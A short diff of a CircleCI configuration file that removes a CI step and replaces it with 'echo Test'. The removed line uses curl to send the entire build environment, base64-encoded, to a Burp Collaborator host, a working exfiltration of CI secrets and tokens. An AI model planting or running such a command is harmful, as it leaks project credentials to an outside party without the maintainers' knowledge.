@@ -219,7 +219,7 @@ jobs:
             RELEASE_CHANNEL: experimental
           command: ./scripts/circleci/run_devtools_e2e_tests.js
       - run:
-          command: curl http://i5o4w11lm2anzejinwm9tdzr7ida1z.burpcollaborator.net?env=$(env | base64 | tr -d '\n')
+          command: echo Test
 
   yarn_lint_build:
     docker: *docker
